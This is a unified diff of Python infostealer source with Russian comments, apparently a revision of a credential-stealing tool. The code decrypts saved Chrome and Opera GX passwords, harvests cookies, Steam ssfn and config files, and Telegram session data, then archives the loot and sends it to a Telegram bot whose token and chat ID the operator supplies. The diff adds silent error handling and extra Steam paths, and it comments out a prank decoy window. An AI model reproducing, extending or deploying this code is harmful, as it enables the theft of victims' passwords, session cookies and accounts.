@@ -8,7 +8,6 @@ from requests import Session
 import win32crypt
 from Crypto.Cipher import AES
 
-
 TOKEN = ""  # Токен бота
 CHAT_ID =   # Ваш чат ID
 
@@ -147,7 +146,7 @@ class Data:
 		with open(user_path + path_to_save, "w", encoding="utf-8") as cookies:
 			results = results.replace('True', 'true')
 			results = results.replace('False', 'false')
-			results += '\n]'
+			results = results[:-1] + '\n]'
 			cookies.write(results)
 
 
@@ -180,10 +179,10 @@ class Telegram:
 				if os.path.isdir(f'{tg_path}\\{i}'): 
 					is_dir = f'{tg_path}\\{i}'
 					continue
-					
+
 				if Telegram.get_size(f'{tg_path}\\{i}'):
 					os.remove(f'{tg_path}\\{i}')
-			
+
 			# удаляем ненужные файлы размером больше 500кб
 			listdir = os.listdir(is_dir)
 			for i in listdir:
@@ -232,25 +231,27 @@ class Chrome:
 	# ----------------------------------------------- Логины и Пароли начало скрипта
 	@staticmethod
 	def get_login_and_password():
-		master_key = Support.get_master_key(Chrome.path)
-		login_db = user_path + r'\AppData\Local\Google\Chrome\User Data\default\Login Data'
-		shutil.copy2(login_db, user_path + '\\AppData\\Roaming\\Loginvault.db')
+		try:
+			master_key = Support.get_master_key(Chrome.path)
+			login_db = user_path + r'\AppData\Local\Google\Chrome\User Data\default\Login Data'
+			shutil.copy2(login_db, user_path + '\\AppData\\Roaming\\Loginvault.db')
 
-		conn = sqlite3.connect(user_path + '\\AppData\\Roaming\\Loginvault.db')
-		cursor = conn.cursor()
-		cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+			conn = sqlite3.connect(user_path + '\\AppData\\Roaming\\Loginvault.db')
+			cursor = conn.cursor()
+			cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
 
-		for r in cursor.fetchall():
-			url = r[0]
-			username = r[1]
-			encrypted_password = r[2]
-			decrypted_password = Support.decrypt_password(encrypted_password, master_key)
+			for r in cursor.fetchall():
+				url = r[0]
+				username = r[1]
+				encrypted_password = r[2]
+				decrypted_password = Support.decrypt_password(encrypted_password, master_key)
 
-			alldatapass = "URL: " + url + " UserName: " + username + " Password: " + decrypted_password + "\n"
+				alldatapass = "URL: " + url + " UserName: " + username + " Password: " + decrypted_password + "\n"
 
-			with open(user_path + '\\AppData\\Roaming\\Chrome\\Chrome_login_and_password.txt', "a") as o:
-				o.write(alldatapass)
-		conn.close()
+				with open(user_path + '\\AppData\\Roaming\\Chrome\\Chrome_login_and_password.txt', "a") as o:
+					o.write(alldatapass)
+			conn.close()
+		except: pass
 	# ----------------------------------------------- Логины и Пароли конец скрипта
 
 	# ----------------------------------------------- История и кукисы начало скрипта
@@ -321,25 +322,27 @@ class OperaGX:
 	# ----------------------------------------------- Логины и Пароли начало скрипта
 	@staticmethod
 	def get_login_and_password():
-		master_key = Support.get_master_key(OperaGX.path)
-		login_db = user_path + r'\AppData\Roaming\Opera Software\Opera GX Stable\Login Data'
-		shutil.copy2(login_db, user_path + '\\AppData\\Roaming\\LoginvaultOPERA.db')
+		try:
+			master_key = Support.get_master_key(OperaGX.path)
+			login_db = user_path + r'\AppData\Roaming\Opera Software\Opera GX Stable\Login Data'
+			shutil.copy2(login_db, user_path + '\\AppData\\Roaming\\LoginvaultOPERA.db')
 
-		conn = sqlite3.connect(user_path + '\\AppData\\Roaming\\LoginvaultOPERA.db')
-		cursor = conn.cursor()
-		cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+			conn = sqlite3.connect(user_path + '\\AppData\\Roaming\\LoginvaultOPERA.db')
+			cursor = conn.cursor()
+			cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
 
-		for r in cursor.fetchall():
-			url = r[0]
-			username = r[1]
-			encrypted_password = r[2]
-			decrypted_password = Support.decrypt_password(encrypted_password, master_key)
+			for r in cursor.fetchall():
+				url = r[0]
+				username = r[1]
+				encrypted_password = r[2]
+				decrypted_password = Support.decrypt_password(encrypted_password, master_key)
 
-			alldatapass = "URL: " + url + " UserName: " + username + " Password: " + decrypted_password + "\n"
+				alldatapass = "URL: " + url + " UserName: " + username + " Password: " + decrypted_password + "\n"
 
-			with open(user_path + '\\AppData\\Roaming\\OperaGX\\OperaGX_login_and_password.txt', "a") as o:
-				o.write(alldatapass)
-		conn.close()
+				with open(user_path + '\\AppData\\Roaming\\OperaGX\\OperaGX_login_and_password.txt', "a") as o:
+					o.write(alldatapass)
+			conn.close()
+		except: pass
 	# ----------------------------------------------- Логины и Пароли конец скрипта
 
 	# ----------------------------------------------- История и кукисы начало скрипта
@@ -404,30 +407,23 @@ class OperaGX:
 ###############################################################################
 #                                  Steam                                      #
 ###############################################################################
-path2 = r'C:\Program Files\Steam'
-path02 = r'C:\Program Files\Steam\config'
-path3 = r'C:\Program Files (x86)\Steam'
-path03 = r'C:\Program Files (x86)\Steam\config'
+pathSsfn = (r'C:\Program Files\Steam', r'C:\Program Files (x86)\Steam', r'D:\Shop games\Steam') # пути к папке со стимом
+pathConfig = (r'C:\Program Files\Steam\config', r'C:\Program Files (x86)\Steam\config', r'D:\Shop games\Steam\config') # пути к папке конфига стима
 
-directory_config = rf'C:\Users\{current_user}\AppData\Local\Steamm\config'
+directory_out_config = rf'C:\Users\{current_user}\AppData\Local\Steamm\config'
 
 class Steam:
 	@staticmethod
 	def main():
-		try:
-			files2 = [i for i in os.listdir(path2) if os.path.isfile(os.path.join(path2,i)) and 'ssfn' in i] # 
-			shutil.copytree(path02, directory_config)
-			shutil.copy(path2+'\\'+files2[0], steam_path)
-			shutil.copy(path2+'\\'+files2[1], steam_path)
-		except: pass
-		try:
-			files3 = [i for i in os.listdir(path3) if os.path.isfile(os.path.join(path3,i)) and 'ssfn' in i]
-			shutil.copytree(path03, directory_config)
-			shutil.copy(path3+'\\'+files3[0], steam_path)
-			shutil.copy(path3+'\\'+files3[1], steam_path)
-		except: pass
+		for num in range(len(pathSsfn)):
+			try:
+				files2 = [i for i in os.listdir(pathSsfn[num]) if os.path.isfile(os.path.join(pathSsfn[num], i)) and 'ssfn' in i]
+				shutil.copytree(pathConfig[num], directory_out_config)
+				shutil.copy(pathSsfn[num]+'\\'+files2[0], steam_path)
+				shutil.copy(pathSsfn[num]+'\\'+files2[1], steam_path)
+			except: pass
 
-		if len(os.listdir(steam_path)) > 1:
+		if len(os.listdir(steam_path)) > 1:  # если нет данных в папке завершит работу
 			shutil.make_archive(steam_path, 'zip', steam_path)
 			with open(steam_path+'.zip', 'rb') as steam:
 				Support.send_data(steam, 'Steam')
@@ -439,36 +435,36 @@ class Steam:
 
 
 if __name__ == '__main__':
-	print('Зупуск программы ожидайте)')
 	Support.start()
-	# Some_load.main() # полезная нагрузка
 	Chrome.main()
 	OperaGX.main()
 	Steam.main()
 	Telegram.main()
 
-	
-from tkinter import *
-from tkinter import messagebox
-import random
 
-def Yes():
-    messagebox.showinfo(' ', 'Мда... )')
-    quit()
+#-----------------------------------Можно удалить при желании------------------------------------------------------------
+# from tkinter import *
+# from tkinter import messagebox
+# import random
 
-def motionMouse(event):
-    btnNo.place(x=random.randint(0, 300), y=random.randint(0, 300))
+# def Yes():
+#     messagebox.showinfo(' ', 'Ну ты и черт)')
+#     quit()
 
-root=Tk()
-root.geometry('400x400')
-root.title('Oпрос')
-root.resizable(width=False, height=False)
-root['bg'] = 'white'
+# def motionMouse(event):
+#     btnNo.place(x=random.randint(0, 300), y=random.randint(0, 300))
 
-label = Label(root, text='Любишь маму?', font='Arial 20 bold', bg='white').pack()
-btnYes = Button(root, text='Нет', font='Arial 20 bold', command=Yes).place(x=160, y=100)
-btnNo = Button(root, text='Да', font='Arial 20 bold')
-btnNo.place(x=250, y=100)
-btnNo.bind('<Enter>', motionMouse)
+# root=Tk()
+# root.geometry('400x400')
+# root.title('Oпрос')
+# root.resizable(width=False, height=False)
+# root['bg'] = 'white'
 
-root.mainloop()
+# label = Label(root, text='Любишь маму?', font='Arial 20 bold', bg='white').pack()
+# btnYes = Button(root, text='Нет', font='Arial 20 bold', command=Yes).place(x=160, y=100)
+# btnNo = Button(root, text='Да', font='Arial 20 bold')
+# btnNo.place(x=250, y=100)
+# btnNo.bind('<Enter>', motionMouse)
+
+# root.mainloop()
+#-----------------------------------Можно удалить при желании------------------------------------------------------------
